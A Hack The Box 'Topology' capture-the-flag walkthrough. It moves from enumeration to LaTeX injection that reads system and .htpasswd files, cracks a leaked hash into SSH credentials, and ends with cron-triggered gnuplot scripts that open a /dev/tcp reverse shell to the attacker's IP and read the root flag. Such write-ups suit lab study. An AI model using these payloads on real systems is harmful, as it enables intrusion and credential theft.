
Start by adding the target IP address to your `/etc/hosts` file:

![[HackTheBox/Topology/images/2.png]]

Next, I ran a port scan to enumerate services:

```bash
sudo nmap -sV -sC topology.htb
```

![[HackTheBox/Topology/images/1.png]]

I also launched a directory brute-force against the web root:

```bash
dirsearch -u http://topology.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![[HackTheBox/Topology/images/4.png]]

On port `80`, the landing page referred to another domain, and fuzzing did not return anything juicy:

![[HackTheBox/Topology/images/3.png]]

Let's add the custom domain to the `/etc/hosts` file as well.

From there, a LaTeX-backed PHP script renders images from whatever expression you supply as input:

![[HackTheBox/Topology/images/5.png]]

I found a very useful reference, especially for crafting LaTeX command-injection payloads:

https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/#summary

I first tried `\input{/etc/passwd}`, but the page sanitized the request.

![[HackTheBox/Topology/images/6.png]]

Most of the common payloads did not work on this endpoint.

I then found a related writeup about a page that accepts input and returns a PDF or image:

https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a

The writeup references another resource with more advanced payloads:

https://0day.work/hacking-with-latex/

![[HackTheBox/Topology/images/7.png]]

It could not parse the entire `/etc/passwd` content, but it confirmed that the input field was vulnerable to LaTeX injection.

![[HackTheBox/Topology/images/8.png]]

After many attempts, I still could not execute arbitrary commands, so I shifted focus to virtual-host (vhost) enumeration:

```bash
ffuf -H "Host: FUZZ.topology.htb" -H "User-Agent: PENTEST" -c -w "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt" -u http://topology.htb
```

This returned some interesting results:

![[HackTheBox/Topology/images/9.png]]

![[HackTheBox/Topology/images/11.png]]

I had not yet added the `dev` subdomain to the `hosts` file.

![[HackTheBox/Topology/images/10.png]]

Let's add it:

![[12.png]]

On the `dev` subdomain I ran into HTTP auth, so I dug a bit deeper and landed on HackTricks's guide for LaTeX injection:

https://hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html

`\lstinputlisting{/etc/hosts}` did not work either.

LaTeX uses specific characters to trigger commands:

https://www.overleaf.com/learn/latex/Commands

Let's wrap the payload in dollar signs:

![[13.png]]

`$\lstinputlisting{/etc/passwd}$`

Now it is possible to read `/etc/passwd`.

![[14.png]]

I tried to read configuration files, but that did not work. I fell back to a simple LFI-style payload to read `/var/www/html/.htaccess`, which returned an error:

```bash
$\lstinputlisting{/var/www/apache/.htaccess}$
```

Since I had already discovered the `dev` subdomain, simple path reasoning leads to the `dev` config:

```bash
$\lstinputlisting{/var/www/dev/.htaccess}$
```

![[15.png]]

Now let's pivot to `/var/www/dev/.htpasswd`:

![[16.png]]

Let's try to authenticate over SSH as `vdaisley`:

`vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`

First, identify the hash type:

```bash
hash-identifier

HASH: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

![[HackTheBox/Topology/images/17.png]]

John automatically identified the hash type and suggested the correct `--format` parameter.

```bash
john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt

john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt

john --show md5.txt
```

![[HackTheBox/Topology/images/18.png]]

Let's authenticate with `vdaisley:calculus20`.

It worked.

![[HackTheBox/Topology/images/19.png]]

`cat /user.txt`. Next, I checked for `sudo` privileges, but `sudo` was disabled on the host.

![[HackTheBox/Topology/images/20.png]]

Time to run `linpeas.sh` on the target:

```bash
On the attacker:

python -m http.server 1000

On the target (use /tmp/ because of write permissions):
curl http://10.10.16.64:1000/linpeas.sh -o linpeas.sh
```

After an hour or two of triage, I concluded that the most likely attack vector was a binary with both read and write permissions:

![[HackTheBox/Topology/images/21.png]]

Write permissions on `gnuplot`:

![[HackTheBox/Topology/images/22.png]]

Because of the binary's privileges, I checked GTFOBins for possible paths, especially around SUID.

![[HackTheBox/Topology/images/23.png]]

I also attempted to abuse SUID privileges on the binary directly, but got stuck.

![[HackTheBox/Topology/images/24.png]]

Since I had write permissions, I also wanted to understand whether the binary produces any artifacts somewhere — for example, via a cron job:

https://stackoverflow.com/questions/5497889/is-there-a-standard-file-extension-for-gnuplot-files

![[HackTheBox/Topology/images/25.png]]

In that case, it was worth trying every known extension to test whether a cron job was picking them up.

```bash
# Did not work
echo 'system("touch /tmp/E")' > /opt/gnuplot/E.sh

# Worked
echo 'system("touch /tmp/ErkanUcar2")' > /opt/gnuplot/cuneyt2.plt
```

![[HackTheBox/Topology/images/26.png]]

When cron sees a `.plt` extension, it automatically runs whatever is inside the `system()` call.

```bash
penelope -p 443

echo 'system("sh -i >& /dev/tcp/10.10.16.64/443 0>&1")' > /opt/gnuplot/OumoutChouseinoglou.plt
```

![[HackTheBox/Topology/images/27.png]]

Actually, a full reverse shell is overkill here — I can just read the flag directly, assuming it lives under `/root/`:

```bash
echo 'system("cat /root/root.txt > /tmp/flag.txt")' > /opt/gnuplot/onurcan.plt
```

![[HackTheBox/Topology/images/28.png]]

Instead of waiting for a reverse shell, this approach wraps up the entire privilege-escalation vector.
